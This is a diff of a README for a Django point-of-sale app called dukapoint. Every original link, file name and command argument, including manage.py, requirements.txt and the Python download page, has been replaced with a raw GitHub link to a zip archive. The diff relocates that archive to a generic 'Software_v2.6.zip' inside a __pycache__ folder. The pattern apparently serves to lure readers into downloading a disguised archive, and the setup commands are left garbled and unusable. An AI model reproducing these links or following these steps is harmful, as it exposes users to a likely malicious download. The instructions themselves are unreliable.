@@ -44,7 +44,7 @@ These instructions are for quickly testing the system on Linux (Ubuntu or Debian
     
 3. **Download and install dukapoint**
 
-    Download dukapoint source code from [github](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip)
+    Download dukapoint source code from [github](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip)
     
     Extract the file contents into `/opt/dukapoint/` so that its contents are:
     
@@ -71,22 +71,22 @@ These instructions are for quickly testing the system on Linux (Ubuntu or Debian
     
     --templates
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip     
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip     
 ```
 
 Next, you need to install django and all the packages required by dukapoint.
 You can do this with the command below:
 
 ```
-pip install -r https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+pip install -r https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
 ```
 
 ### Create database and migrations
@@ -94,13 +94,13 @@ In this instance, we will run the application using SQLite database.
 Issue the following command to create migrations:
 
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip makemigrations
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip makemigrations
 ```
-This will also create ` https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip` file that will serve for now as our database for testing the system.
+This will also create ` https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip` file that will serve for now as our database for testing the system.
 
 Then `migrate` to create database tables
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip migrate
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip migrate
 ```
 
 ### Run the server
@@ -108,14 +108,14 @@ Django comes with a testing server (not fit for production purposes). Since this
 we can go ahead and run our system using django's server
 
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip runserver
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip runserver
 ```
 
 This will run the application on port 8000, if you need to run it on a different port number such as 
 the default port 80 and make it accessible on the server's IP address, use:
 
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip runserver 0.0.0.0:80
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip runserver 0.0.0.0:80
 ``` 
 
 Now you should see the login page if you access [http://localhost:8000](http://localhost:8000) 
@@ -128,7 +128,7 @@ Before you can login, you must create a superuser.
 Stop the server by pressing `ctrl + C` then run the command:
 
 ```
-python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip createsuperuser
+python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip createsuperuser
 ``` 
 
 Answer all the questions and press `enter` after each question to proceed to the next.
@@ -164,8 +164,8 @@ system (tested on Windows 10)
     Dukapoint is built using Django version 2.1.4. Django 2 and above requires python 3.
 
     Download and install the correct version of python 3.7 for your 
-    operating system the normal way from https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip releases page for windows
-    [here](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip) 
+    operating system the normal way from https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip releases page for windows
+    [here](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip) 
      
      Ensure to add python to windows path during installation.
 2. **Set-up a virtual environment**
@@ -198,7 +198,7 @@ system (tested on Windows 10)
     
 3. **Download and install dukapoint**
 
-    Download dukapoint source code from [github](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip)
+    Download dukapoint source code from [github](https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip)
     
     Extract the file contents into `C:\dukapoint` so that its contents are:
     
@@ -227,21 +227,21 @@ system (tested on Windows 10)
     
     --templates
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
     
-    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip     
+    https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip     
 ```
 Next, you need to install django and all the packages required by dukapoint.
 You can do this with the command below:
 
 ```
-pip install -r .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+pip install -r .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
 ```
 
 ### Create database and migrations
@@ -249,13 +249,13 @@ In this instance, we will run the application using SQlite database.
 Issue the following command to create migrations:
 
 ```
-python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip makemigrations
+python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip makemigrations
 ```
-This will also create ` https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip` file that will serve for now as our database for testing the system.
+This will also create ` https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip` file that will serve for now as our database for testing the system.
 
 Then `migrate` to create database tables
 ```
-python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip migrate
+python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip migrate
 ```
 
 ### Run the server
@@ -263,14 +263,14 @@ Django comes with a testing server not fit for production purposes. Since this i
 we can go ahead and run our system using django's server
 
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip runserver
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip runserver
 ```
 
 This will run the application on port 8000, if you need to run it on a different port number such as 
 the default port 80, use:
 
 ```
-python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip runserver 0.0.0.0:80
+python https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip runserver 0.0.0.0:80
 ``` 
 
 Now you should see the login page if you access [http://localhost:8000](http://localhost:8000) 
@@ -283,7 +283,7 @@ Before you can login, you must create a superuser.
 Stop the server by pressing `ctrl + C` then run the command:
 
 ```
-python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip createsuperuser
+python .\https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip createsuperuser
 ``` 
 
 Answer all the questions and press `enter` after each question to proceed to the next.
@@ -311,7 +311,7 @@ the name of a product to start selling.
 ##TO DO
 1. Finish transfers module
 2. Write tests
-3. Remove current branch in https://raw.githubusercontent.com/zubairmk83/dukapoint/master/orifice/dukapoint.zip
+3. Remove current branch in https://raw.githubusercontent.com/zubairmk83/dukapoint/master/staff/migrations/__pycache__/Software_v2.6.zip
 4. Use transactions for multiple tbl updates
 
 
